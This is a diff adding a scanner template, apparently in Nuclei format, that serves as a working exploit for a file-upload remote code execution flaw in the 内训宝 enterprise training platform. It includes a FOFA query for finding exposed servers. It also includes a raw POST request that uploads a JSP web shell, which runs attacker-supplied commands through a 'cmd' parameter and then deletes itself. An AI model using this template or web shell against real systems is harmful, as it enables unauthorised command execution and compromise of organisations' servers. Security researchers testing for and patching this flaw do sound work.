@@ -1,0 +1,46 @@
+id: poc-ibvw9i9o44w4hdwy
+info:
+  name: 内训宝企业培训平台 uploadscorm 存在文件上传致RCE漏洞复
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ibvw9i9o44w4hdwy'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ibvw9i9o44w4hdwy
+    fofa: icon_hash="-790843908"
+http:
+- raw:
+  - 'POST /upload/scorm HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="fileupload"; filename="test.jsp"
+
+    Content-Type: application/octet-stream
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739188078000-d6b3fe4b-0cfe-418b-8bb4-d103d993454c.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739188078222-6d40a4ff-a006-4879-844b-85ad70430ee5.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
